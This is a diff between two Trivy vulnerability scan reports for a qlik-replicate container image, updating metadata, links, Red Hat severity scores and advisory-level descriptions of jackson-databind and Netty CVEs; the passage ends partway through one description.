@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.70.0"
   },
-  "ReportID": "019fa72f-de0e-7375-a56e-22cf2513654d",
-  "CreatedAt": "2026-07-28T05:25:59.950228997Z",
+  "ReportID": "019fac5b-9788-7aa5-af89-16c424d1ab74",
+  "CreatedAt": "2026-07-29T05:31:51.560698912Z",
   "ArtifactID": "sha256:8fbe3e5115fe761f02a91adc3fc08e9c61c398aa220819584aea7c491c844c12",
   "ArtifactName": "qlik-replicate:latest",
   "ArtifactType": "container_image",
@@ -20947,7 +20947,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43400",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
@@ -21026,9 +21026,11 @@
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43218",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -21187,28 +21189,35 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:fe6e75616ecf6a61ee25ee18357d5e93d8c4db2c8ce8fb13df767ab16cf7bab1",
-          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Title": "com.fasterxml.jackson.core/jackson-databind: tools.jackson.core/jackson-databind: jackson-databind: @JsonIgnore bypass in Java Records",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "MEDIUM",
           "CweIDs": [
             "CWE-915"
           ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
               "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59888",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
             "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
             "https://github.com/FasterXML/jackson-databind/pull/5974",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59888"
           ],
           "PublishedDate": "2026-07-14T17:17:15.137Z",
           "LastModifiedDate": "2026-07-15T20:18:23.677Z"
@@ -21367,7 +21376,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43400",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
@@ -21446,9 +21455,11 @@
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43218",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -21607,28 +21618,35 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:fe6e75616ecf6a61ee25ee18357d5e93d8c4db2c8ce8fb13df767ab16cf7bab1",
-          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Title": "com.fasterxml.jackson.core/jackson-databind: tools.jackson.core/jackson-databind: jackson-databind: @JsonIgnore bypass in Java Records",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "MEDIUM",
           "CweIDs": [
             "CWE-915"
           ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
               "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59888",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
             "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
             "https://github.com/FasterXML/jackson-databind/pull/5974",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59888"
           ],
           "PublishedDate": "2026-07-14T17:17:15.137Z",
           "LastModifiedDate": "2026-07-15T20:18:23.677Z"
@@ -21787,7 +21805,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43400",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
@@ -21860,7 +21878,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43400",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
@@ -21939,9 +21957,11 @@
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43218",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -22024,9 +22044,11 @@
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
             "https://errata.almalinux.org/9/ALSA-2026-40895.html",
-            "https://errata.rockylinux.org/RLSA-2026:43218",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -22302,28 +22324,35 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:fe6e75616ecf6a61ee25ee18357d5e93d8c4db2c8ce8fb13df767ab16cf7bab1",
-          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Title": "com.fasterxml.jackson.core/jackson-databind: tools.jackson.core/jackson-databind: jackson-databind: @JsonIgnore bypass in Java Records",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "MEDIUM",
           "CweIDs": [
             "CWE-915"
           ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
               "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59888",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
             "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
             "https://github.com/FasterXML/jackson-databind/pull/5974",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59888"
           ],
           "PublishedDate": "2026-07-14T17:17:15.137Z",
           "LastModifiedDate": "2026-07-15T20:18:23.677Z"
@@ -22353,28 +22382,35 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:fe6e75616ecf6a61ee25ee18357d5e93d8c4db2c8ce8fb13df767ab16cf7bab1",
-          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Title": "com.fasterxml.jackson.core/jackson-databind: tools.jackson.core/jackson-databind: jackson-databind: @JsonIgnore bypass in Java Records",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "MEDIUM",
           "CweIDs": [
             "CWE-915"
           ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
               "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59888",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
             "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
             "https://github.com/FasterXML/jackson-databind/pull/5974",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59888"
           ],
           "PublishedDate": "2026-07-14T17:17:15.137Z",
           "LastModifiedDate": "2026-07-15T20:18:23.677Z"
@@ -22696,7 +22732,7 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:7ccea58e6265c79a6fd5b625de3d6a25600a520db7c378586c4c823f593e357f",
-          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Title": "io.netty/netty-codec-http: Netty: Denial of Service via SPDY SETTINGS frame processing",
           "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty's SPDY SETTINGS decoder accepts a peer-declared SETTINGS entry count up to the 24-bit frame-length limit and materializes every unique setting ID in `DefaultSpdySettingsFrame`, allowing a remote SPDY/3.1 peer to send a syntactically valid roughly 2 MiB SETTINGS frame that creates 262144 map entries and amplifies network input into heap growth and ordered-map insertion work. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "HIGH",
           "CweIDs": [
@@ -22704,22 +22740,29 @@
             "CWE-770"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
               "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-55831",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
             "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
             "https://github.com/netty/netty/security/advisories/GHSA-6jqx-86gh-f27w",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-55831"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55831",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55831"
           ],
           "PublishedDate": "2026-07-21T00:17:35.383Z",
           "LastModifiedDate": "2026-07-23T15:17:16.78Z"
@@ -22749,29 +22792,36 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:44003d8a0688bdeb337edd426500ab9c737b4c6082d3da3a5ac76487e833548d",
-          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Title": "netty: io.netty/netty-codec-http: Netty: Denial of Service via SPDY header decompression amplification",
           "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty SPDY header decoding continues inflating zlib-compressed header blocks after the raw header parser has exceeded `maxHeaderSize` and marked the frame truncated in `SpdyFrameCodec`, allowing a remote peer to send a small compressed `HEADERS` block that expands into much larger raw header data and causes compression-amplified CPU and allocation churn. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "HIGH",
           "CweIDs": [
             "CWE-400"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
               "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-55833",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
             "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
             "https://github.com/netty/netty/security/advisories/GHSA-mvh2-crg5-v77c",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-55833"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55833",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55833"
           ],
           "PublishedDate": "2026-07-21T00:17:35.537Z",
           "LastModifiedDate": "2026-07-23T13:34:45.383Z"
@@ -22801,29 +22851,36 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:a8db4101e420771edd9921a64fa31003b13baa773a7c0d3922e6521b691d96f0",
-          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Title": "netty: io.netty/netty-codec-http: Netty: Denial of Service via memory exhaustion in SPDY-to-HTTP codec",
           "Description": "Netty is a network application framework for development of protocol servers and clients. In versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final, the `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP codec allocates a pooled `ByteBuf` when processing a client-initiated `SYN_STREAM` frame with `FLAG_FIN=0` and stores the partially constructed `FullHttpRequest` in `messageMap`; when the remote peer sends `RST_STREAM` for that stream or the accumulated content exceeds `maxContentLength`, the decoder removes the entry but does not release the pooled `ByteBuf`, causing native memory exhaustion. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "HIGH",
           "CweIDs": [
             "CWE-400"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
               "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-56745",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
             "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
             "https://github.com/netty/netty/security/advisories/GHSA-jppx-w49h-x2qq",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-56745"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56745",
+            "https://www.cve.org/CVERecord?id=CVE-2026-56745"
           ],
           "PublishedDate": "2026-07-21T22:17:14.5Z",
           "LastModifiedDate": "2026-07-22T20:35:40.827Z"
@@ -23212,27 +23269,34 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:7866dd869821a8bdae495103ccd7f96301b1e5b95b5c0c7c15baa93e1488dc36",
-          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Title": "io.netty/netty-codec-http: Netty: Security control bypass allows unauthorized requests via null origin header",
           "Description": "Netty is a network application framework for development of protocol servers and clients. Versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final, are vulnerable to security control bypass during the origin evaluation process. CorsHandler provides a shortCircuit() configuration designed to reject unauthorized cross-origin requests immediately, acting as a security control before requests reach the application. However, due to a logical operator error in the origin evaluation process, this protection can be entirely bypassed. An attacker can bypass the short-circuit mechanism by sending a request with an Origin: null header. This failure forwards unauthorized requests to the backend application, bypassing intended access controls. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "MEDIUM",
           "CweIDs": [
             "CWE-284"
           ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
               "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-56746",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
             "https://github.com/netty/netty/security/advisories/GHSA-6cqp-g7gg-8hr5",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-56746"
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56746",
+            "https://www.cve.org/CVERecord?id=CVE-2026-56746"
           ],
           "PublishedDate": "2026-07-21T22:17:14.667Z",
           "LastModifiedDate": "2026-07-22T20:35:40.827Z"
@@ -23262,23 +23326,31 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:64876e4c20f573f470f84a8badb33c1ea2efddda0217891ae11109471b31e52b",
-          "Title": "Netty: WebSockets V07/V08 handshaker missing Connection/Upgrade validation",
-          "Description": "## Summary\nAn attacker can force WebSocket upgrade via the lax V07 (or V08) handshaker by sending `Sec-WebSocket-Version: 7` and omitting `Connection: Upgrade` / `Upgrade: websocket` headers, completing a protocol switch that a proxy would not recognize as an Upgrade request and enabling HTTP request smuggling / protocol-confusion attacks.",
+          "Title": "io.netty/netty-codec-http: Netty: Protocol version confusion in netty-codec-http (WebSocket)",
+          "Description": "A flaw was found in netty-codec-http. The WebSocket handshaker in this component fails to properly validate protocol version information during the WebSocket upgrade process. A remote attacker can exploit this vulnerability by manipulating the WebSocket handshake, leading to a bypass of security checks or the negotiation of unexpected protocol versions. This could potentially enable protocol-level attacks.",
           "Severity": "MEDIUM",
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
               "V40Score": 6.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 5.3
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59898",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
-            "https://github.com/netty/netty/security/advisories/GHSA-4mp9-239f-g9hg"
+            "https://github.com/netty/netty/security/advisories/GHSA-4mp9-239f-g9hg",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59898",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59898"
           ]
         },
         {
@@ -23306,23 +23378,32 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:db509898921e8aaef6d735e0648b523734b58437333de15084529085796ab93d",
-          "Title": "Netty: [HttpContentEncoder] Unbounded Per-Connection Queue Growth via HTTP/1.1 Pipelining Leads to Denial of Service",
-          "Description": "### Impact\n`HttpContentEncoder` (the superclass of the production handler `HttpContentCompressor`) maintains a per-channel `ArrayDeque\u003cCharSequence\u003e` named `acceptEncodingQueue` that accumulates attacker-controlled data without any size limit. The queue is filled on the I/O thread for every inbound HTTP request and drained only when the application later writes a non-1xx response. This creates a resource exhaustion vulnerability when an attacker exploits HTTP/1.1 pipelining to flood the connection with requests faster than the application produces responses.",
+          "Title": "io.netty/netty-codec-http: Netty: Memory exhaustion in netty-codec-http (decompression bomb)",
+          "Description": "A flaw was found in the Netty netty-codec-http component. A remote attacker can send HTTP requests containing highly compressed data. The HTTP decoder in netty-codec-http fails to properly limit the decompression of this content, causing the system to consume excessive memory. This can lead to memory exhaustion and a denial of service (DoS), making the service unavailable to legitimate users.",
           "Severity": "MEDIUM",
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
               "V40Score": 6.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59899",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
-            "https://github.com/netty/netty/security/advisories/GHSA-q4f6-jm68-57ww"
+            "https://github.com/netty/netty/security/advisories/GHSA-q4f6-jm68-57ww",
+            "https://netty.io/news/2026/07/09/4-1-136-Final.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59899",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59899"
           ]
         },
         {
@@ -23350,24 +23431,37 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:c39559646d0989996a0df349f6215c31742e734ef561b21be192dcd86567e899",
-          "Title": "Netty: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder",
-          "Description": "# Security Vulnerability Report: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder\n\n## 1. Vulnerability Summary\n\n| Field | Value |\n|-------|-------|\n| **Product** | Netty |\n| **Version** | 4.2.12.Final (and all prior versions with codec-http multipart) |\n| **Component** | `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` |\n| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: HTTP Response Splitting |\n| **Impact** | MIME Header Injection / Content-Type Spoofing / XSS via Content-Disposition |\n| **CVSS 3.1 Score** | **8.1 (High)** |\n| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |\n| **Attack Vector** | Network |\n| **Attack Complexity** | Low |\n| **Privileges Required** | Low (attacker must be able to upload files with controlled filenames) |\n| **User Interaction** | None |\n| **Scope** | Unchanged |\n| **Confidentiality Impact** | High |\n| **Integrity Impact** | High |\n| **Availability Impact** | None |\n\n## 2. Affected Components\n\nThe following classes in the `codec-http` module are affected:\n\n- `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` — directly concatenates unvalidated filename/name into `Content-Disposition` MIME headers (lines 519, 633, 674, 682, 686-688)\n- `io.netty.handler.codec.http.multipart.DiskFileUpload` — `setFilename()` only checks null (line 78)\n- `io.netty.handler.codec.http.multipart.MemoryFileUpload` — `setFilename()` only checks null (line 60)\n- 